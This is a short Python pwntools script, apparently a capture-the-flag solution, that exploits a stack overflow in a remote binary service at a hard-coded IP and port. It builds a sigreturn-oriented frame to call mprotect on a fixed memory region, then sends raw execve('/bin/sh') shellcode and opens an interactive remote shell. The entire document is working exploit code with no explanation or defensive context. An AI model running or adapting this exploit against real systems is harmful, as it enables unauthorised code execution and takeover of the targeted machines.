from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
io = remote("178.62.11.21", 30941)

vul_function = 0x40102E
vul_pointer = 0x4010d8
writeable = 0x400000
syscall_ret = 0x401014

frame = SigreturnFrame(kernel='amd64')
frame.rax = 10
frame.rdi = writeable
frame.rsi = 0x4000
frame.rdx = 0x7
frame.rsp = vul_pointer
frame.rip  = syscall_ret

payload = b'a' * 0x20 + p64(0xdeadbeef) + p64(vul_function) + p64(syscall_ret) + bytes(frame)
io.send(payload)
payload1 = b'a' * 0xf
io.send(payload1)
io.recv()
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
payload2 = shellcode + b'a' * (32-len(shellcode)) + p64(0xdeadbeef) + p64(0x4010b8)
io.send(payload2)
io.recv()
io.interactive()
